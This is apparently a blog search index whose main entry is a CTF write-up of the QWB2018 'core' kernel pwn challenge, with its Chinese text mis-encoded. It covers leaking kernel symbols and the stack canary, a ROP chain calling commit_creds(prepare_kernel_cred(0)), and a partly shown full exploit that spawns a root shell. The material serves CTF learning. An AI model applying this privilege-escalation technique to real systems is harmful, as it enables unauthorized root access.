<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>IDA æ¢ä¸»é¢˜</title>
    <link href="/2023/12/20/%E6%9D%82%E9%A1%B9/IDA%20%E6%8D%A2%E4%B8%BB%E9%A2%98/"/>
    <url>/2023/12/20/%E6%9D%82%E9%A1%B9/IDA%20%E6%8D%A2%E4%B8%BB%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>åœ¨è¿™é‡Œä¸‹çš„ä¸»é¢˜ <a href="https://github.com/Reverier-Xu/IDA-Skins">https://github.com/Reverier-Xu/IDA-Skins</a></p><p>åœ¨options-&gt;coloré‡Œæ¢</p><p>ï¼ˆï¿£ï¸¶ï¿£ï¼‰â†—ã€€</p><p><img src="/img/basic/10.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>æ‚é¡¹</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Others</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>kernel pwn</title>
    <link href="/2023/12/19/ctf-pwn/kernel%20pwn/"/>
    <url>/2023/12/19/ctf-pwn/kernel%20pwn/</url>
    
    <content type="html"><![CDATA[<p>å‰ç½®çŸ¥è¯†è§<a href="https://isolator-1.github.io/2023/12/13/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/OS/">è¿™ç¯‡</a>ï¼Œè®°å½•äº†æ§åˆ¶æµè½¬ç§»å’Œcredçš„ç›¸å…³å†…å®¹</p><h3 id="é•œåƒæ ¼å¼"><a href="#é•œåƒæ ¼å¼" class="headerlink" title="é•œåƒæ ¼å¼"></a>é•œåƒæ ¼å¼</h3><p><code>bzImage</code> ï¼šé€‚ç”¨äºå¤§äº512kBçš„kernelï¼Œå¼€å¤´è‡ªå¸¦gzipçš„è§£å‹ä»£ç </p><p><code>zImage</code> ï¼šå°äº512kBçš„kernel</p><p><code>vmlinux</code> ï¼šé™æ€é“¾æ¥çš„linux kernelå¯æ‰§è¡Œæ–‡ä»¶ï¼Œå‹ç¼©ä¹‹åï¼ˆæ·»åŠ è§£å‹ä»£ç ï¼‰ä¸º<code>vmlinuz</code>ï¼Œå³<code>bzImage</code>æˆ–<code>zImage</code></p><h3 id="å¼ºç½‘æ¯2018-core"><a href="#å¼ºç½‘æ¯2018-core" class="headerlink" title="å¼ºç½‘æ¯2018 - core"></a>å¼ºç½‘æ¯2018 - core</h3><p>ä¸€é“æœ€ç®€å•çš„kernel pwnï¼Œæ˜¯ä¸ªropé¢˜</p><p>ä»åˆ«äººçš„åšå®¢ä¸‹çš„æ–‡ä»¶ï¼š<a href="https://arttnba3.cn/download/qwb2018/pwn/core.7z">https://arttnba3.cn/download/qwb2018/pwn/core.7z</a></p><p>è§£å‹ä¹‹åæœ‰<code>bzImage</code> <code>start.sh</code> <code>vmlinux</code> <code>core.cpio</code> å››ä¸ªæ–‡ä»¶</p><p>å…ˆçœ‹<code>start.sh</code> ç¬¬ä¸€ä¸ªå‚æ•°<code>-m</code>æŒ‡å®šè™šæ‹Ÿæœºå†…å­˜å¤§å°ï¼Œä¸€å¼€å§‹ç»™çš„æ˜¯64Mï¼Œä½†æ˜¯å¼€ä¸å¼€æœºï¼Œæ‰€ä»¥è¦æ”¹å¤§ä¸€ç‚¹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">qemu-system-x86_64 \<br>-m 128M \<br>-kernel ./bzImage \<br>-initrd  ./core.cpio \<br>-append <span class="hljs-string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot;</span> \<br>-s  \<br>-netdev user,<span class="hljs-built_in">id</span>=t0, -device e1000,netdev=t0,<span class="hljs-built_in">id</span>=nic0 \<br>-nographic  \<br></code></pre></td></tr></table></figure><p><code>-initrd</code>å‚æ•°ç”¨äºæŒ‡å®šä¸€ä¸ªåŒ…å«åˆå§‹åŒ– RAM diskï¼ˆinitramfsï¼‰çš„æ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶å°†ä¼šåœ¨è™šæ‹Ÿæœºå¯åŠ¨æ—¶åŠ è½½åˆ°å†…å­˜ä¸­ã€‚åœ¨å¯åŠ¨Linuxå†…æ ¸æ—¶ï¼Œinitramfsé€šå¸¸åŒ…å«ç”¨äºå¼•å¯¼ã€åˆå§‹åŒ–å’ŒæŒ‚è½½æ ¹æ–‡ä»¶ç³»ç»Ÿæ‰€éœ€çš„æ–‡ä»¶å’Œè„šæœ¬ã€‚å…¶ä»–çš„å‚æ•°å°±å…ˆä¸ç®¡äº†</p><p><code>-nographic</code>åˆ æ‰ä¹‹åä¼šå¡åœ¨booting the kernelï¼Œä¸çŸ¥é“ä¸ºå•¥</p><p><code>-kernel</code> æŒ‡å®šå†…æ ¸é•œåƒ </p><blockquote><p>å¦‚æœæ²¡ç»™vmlinuxï¼Œæ˜¯å¯ä»¥ä»bzImageæå–å‡ºæ¥çš„ï¼Œç”¨torvalds linuså†™çš„shell scriptsğŸ˜®<br><a href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux">https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux</a></p></blockquote><p>é¦–å…ˆè§£å‹æ–‡ä»¶ç³»ç»Ÿ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mv</span> core.cpio core.cpio.gz<br>gunzip ./core.cpio.gz <br>cpio -idm &lt; ./core.cpio<br></code></pre></td></tr></table></figure><p>è¿™æ ·å°±æŠŠæ–‡ä»¶ç³»ç»Ÿæå–å‡ºæ¥äº†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">ubuntu@ubuntu:~/Desktop/give_to_player$ <span class="hljs-built_in">cd</span> core<br>ubuntu@ubuntu:~/Desktop/give_to_player/core$ <span class="hljs-built_in">ls</span><br>bin      etc          init  lib64    proc  sbin  tmp  vmlinux<br>core.ko  gen_cpio.sh  lib   linuxrc  root  sys   usr<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹<code>init</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/sh</span><br>mount -t proc proc /proc<br>mount -t sysfs sysfs /sys<br>mount -t devtmpfs none /dev<br>/sbin/mdev -s<br>mkdir -p /dev/pts<br>mount -vt devpts -o gid=4,mode=620 none /dev/pts<br>chmod 666 /dev/ptmx<br>cat /proc/kallsyms &gt; /tmp/kallsyms<br>echo 1 &gt; /proc/sys/kernel/kptr_restrict<br>echo 1 &gt; /proc/sys/kernel/dmesg_restrict<br>ifconfig eth0 up<br>udhcpc -i eth0<br>ifconfig eth0 10.0.2.15 netmask 255.255.255.0<br>route add default gw 10.0.2.2<br>insmod /core.ko<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">poweroff -d 120 -f &amp;    120ç§’ä¹‹åè‡ªåŠ¨å…³æœºï¼Œæ³¨é‡Šæ‰</span><br>setsid /bin/cttyhack setuidgid 1000 /bin/sh<br>echo &#x27;sh end!\n&#x27;<br>umount /proc<br>umount /sys<br><br>poweroff -d 0  -f           <br></code></pre></td></tr></table></figure><p>å…¶ä¸­<code>cat /proc/kallsyms &gt; /tmp/kallsyms</code>æŠŠç¬¦å·è¡¨å¤åˆ¶äº†ä¸€ä»½å‡ºæ¥ï¼Œè¿™ä¸ª<code>kallsyms</code>æä¾›äº†kernelçš„ç¬¦å·è¡¨ä¿¡æ¯ï¼ŒæŠŠç¬¦å·è¡¨å¤åˆ¶åˆ°äº†tmpé‡Œï¼Œå› æ­¤å¯ä»¥é€šè¿‡å®ƒæ¥æ³„éœ²<code>commit_creds</code>å’Œ<code>prepare_kernel_cred</code>ï¼ˆä½†å› ä¸ºå¼€äº†kaslrï¼Œè¿˜è¦ç®—åç§»é‡ï¼‰</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs dns">/ $ cat /tmp/kallsyms <br><span class="hljs-number">0000000000000000</span> <span class="hljs-keyword">A</span> irq_stack_union<br><span class="hljs-number">0000000000000000</span> <span class="hljs-keyword">A</span> __per_cpu_start<br>ffffffff<span class="hljs-number">91200000</span> T startup_64<br>ffffffff<span class="hljs-number">91200000</span> T _stext<br>ffffffff<span class="hljs-number">91200000</span> T _text<br>ffffffff<span class="hljs-number">91200030</span> T secondary_startup_64<br>ffffffff<span class="hljs-number">912000e0</span> T verify_cpu<br>ffffffff<span class="hljs-number">912001e0</span> T start_cpu0<br>ffffffff<span class="hljs-number">912001f0</span> T __startup_64<br>ffffffff<span class="hljs-number">91200370</span> T __startup_secondary_64<br>ffffffff<span class="hljs-number">91200380</span> t run_init_process<br>ffffffff<span class="hljs-number">912003b0</span> t try_to_run_init_process<br>ffffffff<span class="hljs-number">912003e0</span> t initcall_blacklisted<br>ffffffff<span class="hljs-number">912004a0</span> T do_one_initcall<br>ffffffff<span class="hljs-number">91200600</span> t match_dev_by_uuid<br>ffffffff<span class="hljs-number">91200630</span> T name_to_dev_t<br></code></pre></td></tr></table></figure><blockquote><p>init ä¸­ï¼Œkptr_restrict = 1ï¼Œä¸èƒ½ç›´æ¥è¯»/proc/kallsyms</p><p>ä½†æ˜¯è¯•äº†ä¸€ä¸‹ï¼Œå‘ç°è¿˜æ˜¯å¯ä»¥é€šè¿‡catè¯»å–ç¬¦å·è¡¨ï¼ˆæ²¡æœ‰rootï¼Œuidè¿˜æ˜¯1000ï¼‰ä½†æ˜¯expé‡Œæ”¹æˆprocä¹‹åkernelä¼šå´©æºƒ</p></blockquote><p>è·å–è¿™ä¸¤ä¸ªå‡½æ•°åœ°å€çš„ä»£ç å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs C">ksyms_file = fopen(<span class="hljs-string">&quot;/proc/kallsyms&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br><span class="hljs-keyword">if</span>(ksyms_file == <span class="hljs-literal">NULL</span>) &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to open the sym_table file!\033[0m&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>&#125;<br><br><span class="hljs-keyword">while</span>(<span class="hljs-built_in">fscanf</span>(ksyms_file, <span class="hljs-string">&quot;%lx%s%s&quot;</span>, &amp;addr, type, buf)) &#123;<br>    <span class="hljs-keyword">if</span>(prepare_kernel_cred &amp;&amp; commit_creds) &#123;<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!commit_creds &amp;&amp; !<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;commit_creds&quot;</span>)) &#123;<br>        commit_creds = addr;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m&quot;</span><br>               <span class="hljs-string">&quot;[+] Successful to get the addr of commit_cread:&quot;</span><br>               <span class="hljs-string">&quot;\033[0m%lx\n&quot;</span>, commit_creds);<br>        <span class="hljs-keyword">continue</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;prepare_kernel_cred&quot;</span>)) &#123;<br>        prepare_kernel_cred = addr;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m&quot;</span><br>               <span class="hljs-string">&quot;[+] Successful to get the addr of prepare_kernel_cred:&quot;</span><br>               <span class="hljs-string">&quot;\033[0m%lx\n&quot;</span>, prepare_kernel_cred);<br>        <span class="hljs-keyword">continue</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨initä¸­ï¼ŒismodåŠ è½½äº†ä¸€ä¸ªè‡ªå®šä¹‰çš„æ¨¡å—</p><blockquote><p><code>insmod</code> æ˜¯ Linux ç³»ç»Ÿä¸Šç”¨äºåŠ è½½å†…æ ¸æ¨¡å—çš„å‘½ä»¤ã€‚<code>insmod</code> å‘½ä»¤å…è®¸ä½ å°†ä¸€ä¸ªé¢„ç¼–è¯‘çš„å†…æ ¸æ¨¡å—æ’å…¥ï¼ˆå³åŠ è½½ï¼‰åˆ°è¿è¡Œçš„å†…æ ¸ä¸­ã€‚</p></blockquote><p>ç”¨idaæ‰“å¼€æå–å‡ºæ¥çš„core.ko</p><p>é¦–å…ˆï¼Œè¿™ä¸ªç¨‹åºåœ¨init moduleé‡Œåˆ›å»ºäº†ä¸€ä¸ªå«coreçš„è¿›ç¨‹</p><p>æ‰¾åˆ°core_ioctlï¼Œè¿™ä¸ªå°±æ˜¯è°ƒç”¨å‡½æ•°ioctlæ‰§è¡Œçš„ä»£ç </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">core_ioctl</span><span class="hljs-params">(__int64 a1, __int64 a2, __int64 a3)</span><br>&#123;<br>  <span class="hljs-keyword">switch</span> ( (_DWORD)a2 )<br>  &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">0x6677889B</span>:<br>      core_read(a3);<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">0x6677889C</span>:<br>      printk(&amp;unk_2CD, a3);<br>      off = a3;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">0x6677889A</span>:<br>      printk(&amp;unk_2B3, a2);<br>      core_copy_func(a3);<br>      <span class="hljs-keyword">break</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>å®é™…çš„æ¼æ´ç‚¹åœ¨core_readé‡Œï¼Œå®ƒçš„å‚æ•°ï¼Œä¹Ÿå°±æ˜¯ioctlçš„ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œæ˜¯ç”¨æˆ·æ€æ ˆä¸Šçš„å‚æ•°ï¼Œå‘è¿™ä¸ªåœ°å€å†™å…¥64ä¸ªå­—èŠ‚ï¼Œå¯ä»¥ç”¨æ¥æ³„éœ²canary</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 __fastcall <span class="hljs-title function_">core_read</span><span class="hljs-params">(__int64 a1, __int64 a2)</span><br>&#123;<br>  <span class="hljs-type">char</span> *v3; <span class="hljs-comment">// rdi</span><br>  __int64 i; <span class="hljs-comment">// rcx</span><br>  <span class="hljs-type">unsigned</span> __int64 result; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">char</span> v6[<span class="hljs-number">64</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-50h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v7; <span class="hljs-comment">// [rsp+40h] [rbp-10h]</span><br><br>  v7 = __readgsqword(<span class="hljs-number">0x28</span>u);<br>  printk(&amp;unk_25B, a2);<br>  printk(&amp;unk_275, off);<br>  v3 = v6;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">16LL</span>; i; --i )<br>  &#123;<br>    *(_DWORD *)v3 = <span class="hljs-number">0</span>;<br>    v3 += <span class="hljs-number">4</span>;<br>  &#125;<br>  <span class="hljs-built_in">strcpy</span>(v6, <span class="hljs-string">&quot;Welcome to the QWB CTF challenge.\n&quot;</span>);<br>  result = copy_to_user(a1, &amp;v6[off], <span class="hljs-number">64LL</span>);<br>  <span class="hljs-keyword">if</span> ( !result )<br>    <span class="hljs-keyword">return</span> __readgsqword(<span class="hljs-number">0x28</span>u) ^ v7;<br>  __asm &#123; swapgs &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç»“åˆå‰é¢çš„ioctlï¼Œå¯ä»¥å¾—åˆ°å¦‚ä¸‹exp</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">set_off_val(fd, <span class="hljs-number">64</span>);<br>core_read(fd, buf);<br>canary = ((<span class="hljs-type">size_t</span> *)buf)[<span class="hljs-number">0</span>];<br></code></pre></td></tr></table></figure><p>åœ¨core writeå‡½æ•°é‡Œï¼Œç”¨æˆ·å¯ä»¥å¯¹ç€kernel stackè¿›è¡Œå†™å…¥ï¼ˆè‡³å¤š0x800å­—èŠ‚ï¼‰ï¼Œè¿™é‡Œå¯ä»¥æ„é€ ropæº¢å‡º</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c">offset = commit_creds - <span class="hljs-number">0xffffffff8109c8e0</span>;   <br><span class="hljs-comment">// å…³äºè¿™ä¸ªåç§»é‡æ€ä¹ˆç®—çš„ï¼Œå…³æ‰kaslrï¼Œç„¶åæ‰“å¼€kallsymsï¼ŒæŸ¥çœ‹è¿™ä¸ªå‡½æ•°çš„åœ°å€</span><br><span class="hljs-comment">// ä½†æ˜¯ctf-wikié‚£ä¸ªæˆ‘æ²¡çœ‹æ‡‚ï¼Œhex(vmlinux.sym[&#x27;commit_creds&#x27;] - 0xffffffff81000000)æˆ‘å’Œå®ƒä¸ä¸€æ ·ï¼Œä¸çŸ¥é“å®ƒç”¨çš„æ˜¯å“ªä¸ªvmlinuxï¼Œæˆ‘ç”¨æ ¹ç›®å½•ä¸‹çš„é‚£ä¸ªæ˜¯ä¸å¯¹çš„</span><br><span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>;i++) &#123;<br>    rop_chain[i] = canary;<br>&#125;<br>rop_chain[i++] = POP_RDI_RET + offset;<br>rop_chain[i++] = <span class="hljs-number">0</span>;<br>rop_chain[i++] = prepare_kernel_cred;<br>rop_chain[i++] = POP_RDX_RET + offset;<br>rop_chain[i++] = POP_RCX_RET + offset; <span class="hljs-comment">// clear useless stack data</span><br>rop_chain[i++] = MOV_RDI_RAX_CALL_RDX + offset;<br>rop_chain[i++] = commit_creds;<br>rop_chain[i++] = SWAPGS_POPFQ_RET + offset;<br>rop_chain[i++] = <span class="hljs-number">0</span>;<br>rop_chain[i++] = IRETQ + offset;<br>rop_chain[i++] = (<span class="hljs-type">size_t</span>)get_root_shell;<br>rop_chain[i++] = user_cs;<br>rop_chain[i++] = user_rflags;<br>rop_chain[i++] = user_sp;<br>rop_chain[i++] = user_ss;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œè¦ç”¨åˆ°çš„ropæ˜¯ç”¨ropper(pip3 install)ç®—çš„ï¼Œä½†æ˜¯è¿™ä¸ªå¥½åƒå¯¹æ€§èƒ½è¦æ±‚å¾ˆé«˜ï¼ˆ</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">time ~<span class="hljs-regexp">/.local/</span>bin<span class="hljs-regexp">/ropper --file ./</span>vmlinux --nocolor &gt; g1<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªè¾“å‡ºæœ‰24MğŸ˜µâ€ğŸ’«</p><p>å®Œæ•´expï¼ˆè¿˜æ˜¯æŠ„çš„arttnba3å¤§ä½¬çš„ï¼‰ğŸ„ğŸ„ğŸ„ğŸ„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDI_RET 0xffffffff81000b2f</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MOV_RDI_RAX_CALL_RDX 0xffffffff8101aa6a</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDX_RET 0xffffffff810a0f49</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RCX_RET 0xffffffff81021e53</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_POPFQ_RET 0xffffffff81a012da</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>  IRETQ 0xffffffff81050ac2</span><br><br><span class="hljs-type">size_t</span> commit_creds = <span class="hljs-number">0</span>, prepare_kernel_cred = <span class="hljs-number">0</span>;<br><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><span class="hljs-type">void</span> <span class="hljs-title function_">save_status</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">asm</span> <span class="hljs-title function_">volatile</span> <span class="hljs-params">(</span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;pushf;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;pop user_rflags;&quot;</span></span><br><span class="hljs-params">    )</span>;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_root_shell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(getuid()) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m&quot;</span><br>         <span class="hljs-string">&quot;[+] Successful to get the root. Execve root shell now...&quot;</span><br>         <span class="hljs-string">&quot;\033[0m&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">core_read</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">char</span> * buf)</span><br>&#123;<br>    ioctl(fd, <span class="hljs-number">0x6677889B</span>, buf);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">set_off_val</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">size_t</span> off)</span><br>&#123;<br>    ioctl(fd, <span class="hljs-number">0x6677889C</span>, off);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">core_copy</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">size_t</span> nbytes)</span><br>&#123;<br>    ioctl(fd, <span class="hljs-number">0x6677889A</span>, 